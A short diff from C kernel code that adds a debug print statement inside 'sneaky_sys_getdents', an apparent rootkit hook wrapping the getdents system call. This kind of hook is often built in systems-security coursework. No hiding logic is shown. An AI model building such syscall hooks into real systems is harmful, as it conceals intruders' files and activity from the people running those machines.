@@ -61,6 +61,7 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
     int nread = original_getdents(regs);
     struct linux_dirent64 * dirp = (struct linux_dirent64 *)regs->si;
     int bpos;
+    printk(KERN_INFO"enter my_getdents\n");
 
     if (nread == -1) {
         return -1;
